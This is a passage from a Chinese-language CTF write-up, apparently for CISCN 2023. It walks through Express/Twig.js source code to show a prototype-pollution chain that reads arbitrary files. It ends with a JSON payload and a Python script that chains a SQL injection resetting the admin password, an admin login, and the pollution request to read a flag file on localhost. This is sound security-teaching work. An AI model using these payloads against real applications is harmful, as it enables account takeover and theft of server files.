class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span>) &#123;<br>   <span class="hljs-comment">// get extension from default engine name</span><br>   <span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span>[<span class="hljs-number">0</span>] !== <span class="hljs-string">&#x27;.&#x27;</span><br>     ? <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span><br>     : <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span>;<br><br>   fileName += <span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>fileName被设置为了<code>admin.twig</code></p><p>接着还是在view.js里会调用lookup方法，根据文件名<code>admin.twig</code>查找并设置<code>path</code>值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// lookup path</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookup</span>(fileName);<br></code></pre></td></tr></table></figure><p>然后又跳到了application.js里的view.render()里面</p><p>接着到twig.js里的<code>Twig.exports.renderFile()</code>，然后是Twig.exports.twig(params),这里的作用是加载渲染twig模板并输出。</p><p>进入<code>Twig.exports.renderFile()</code>后显示对params的各个参数进行判断</p><p>由于在上面我们知道了path值已经被设置为了<code>admin.twig</code>所以这里会进入判断，同时要注意这里传入的params对象已经没有了path属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (params.<span class="hljs-property">path</span> !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-title function_">loadRemote</span>(params.<span class="hljs-property">path</span>, &#123;<br>        <span class="hljs-attr">id</span>: id,<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;fs&#x27;</span>,<br>        <span class="hljs-attr">parser</span>: params.<span class="hljs-property">parser</span> || <span class="hljs-string">&#x27;twig&#x27;</span>,<br>        <span class="hljs-attr">base</span>: params.<span class="hljs-property">base</span>,<br>        <span class="hljs-attr">module</span>: params.<span class="hljs-property">module</span>,<br>        <span class="hljs-attr">precompiled</span>: params.<span class="hljs-property">precompiled</span>,<br>        <span class="hljs-attr">async</span>: params.<span class="hljs-property">async</span>,<br>        <span class="hljs-attr">options</span>: options<br>      &#125;, params.<span class="hljs-property">load</span>, params.<span class="hljs-property">error</span>);<br>    &#125;<br>  &#125;; <span class="hljs-comment">// Extend Twig with a new filter.</span><br></code></pre></td></tr></table></figure><p>接着是<code>loadRemote</code>函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-property">loadRemote</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">location, params, callback, errorCallback</span>) &#123;<br>    <span class="hljs-comment">// Default to the URL so the template is cached.</span><br>    <span class="hljs-keyword">var</span> id = <span class="hljs-keyword">typeof</span> params.<span class="hljs-property">id</span> === <span class="hljs-string">&#x27;undefined&#x27;</span> ? location : params.<span class="hljs-property">id</span>;<br>    <span class="hljs-keyword">var</span> cached = <span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-property">registry</span>[id]; <span class="hljs-comment">// Check for existing template</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Twig</span>.<span class="hljs-property">cache</span> &amp;&amp; <span class="hljs-keyword">typeof</span> cached !== <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>      <span class="hljs-comment">// A template is already saved with the given id.</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-title function_">callback</span>(cached);<br>      &#125; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> if async, return deferred promise</span><br><br><br>      <span class="hljs-keyword">return</span> cached;<br>    &#125; <span class="hljs-comment">// If the parser name hasn&#x27;t been set, default it to twig</span><br><br><br>    params.<span class="hljs-property">parser</span> = params.<span class="hljs-property">parser</span> || <span class="hljs-string">&#x27;twig&#x27;</span>;<br>    params.<span class="hljs-property">id</span> = id; <span class="hljs-comment">// Default to async</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> params.<span class="hljs-property">async</span> === <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>      params.<span class="hljs-property">async</span> = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-comment">// Assume &#x27;fs&#x27; if the loader is not defined</span><br><br><br>    <span class="hljs-keyword">var</span> loader = <span class="hljs-variable language_">this</span>.<span class="hljs-property">loaders</span>[params.<span class="hljs-property">method</span>] || <span class="hljs-variable language_">this</span>.<span class="hljs-property">loaders</span>.<span class="hljs-property">fs</span>;<br>    <span class="hljs-keyword">return</span> loader.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, location, params, callback, errorCallback);<br>  &#125;; <span class="hljs-comment">// Determine object type</span><br></code></pre></td></tr></table></figure><p>这边是通过params的id来加载模版。location变量正好是上面传入的<code>params.path</code>，且params.id为非空，所以这里是通过<code>params.id</code>来加载模板。而在上面的代码中，id的值也正好是path的值。</p><p><img src="/img/2023ciscn/1.png"></p><p>接着会通过call函数会调用到<code>registerLoader</code>函数</p><p><code>registerLoader</code>函数我们可以关注下面这一条</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (precompiled === <span class="hljs-literal">true</span>) &#123;<br>        data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);<br>      &#125;<br><br>      params.<span class="hljs-property">data</span> = data;<br>      params.<span class="hljs-property">path</span> = params.<span class="hljs-property">path</span> || location; <span class="hljs-comment">// Template is in data</span><br><br></code></pre></td></tr></table></figure><p>因为在之前params的path属性已经被销毁，这里默认是location的路径。所以这里可以推测出一条利用链，通过原型链污染来控制path属性从而读取任意文件。</p><p>所以原型链可以按如下格式进行构造</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;protoytpe&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;flag路径&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>根据上面的分析可以编写以下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">![<span class="hljs-number">2</span>](images/<span class="hljs-number">2.</span>png)<span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib <span class="hljs-keyword">as</span> md5<br><span class="hljs-keyword">import</span> json<br><br>s=requests.session()<br>url=<span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SQLinjection</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span><br>    passwd=<span class="hljs-string">&#x27;123456&#x27;</span><br>    <span class="hljs-built_in">hash</span>=passwd.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;admin&#x27;,&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27;) on CONFLICT DO UPDATE SET password=&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27; --+&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected successfully!\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected failed&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>    SQLinjection(url)<br><br><span class="hljs-comment">#忘记写登录的逻辑了</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Login</span>(<span class="hljs-params">url</span>):<span class="hljs-comment">#获取登录session</span><br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/login&#x27;</span><br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Login successful&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Login failed&quot;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollution</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/admin&#x27;</span><br>    data=&#123;<span class="hljs-string">&quot;constructor&quot;</span>:&#123;<span class="hljs-string">&quot;prototype&quot;</span>:&#123;<span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;/Users/sammy/Desktop/临时题目文件夹/pollute/flag.txt&quot;</span>&#125;&#125;<br>    &#125;<br>    data=json.dumps(data)<br>    res=s.post(url=url,data=data,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;polluted successfully\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;polluted failed\n&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    SQLinjection(url)<br>    Login(url)<br>    pollution(url)<br></code></pre></td></tr></table></figure><p>获得flag</p><p><img src="/img/2023ciscn/2.png"></p><p>参考文章：kento师傅的复现wp</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
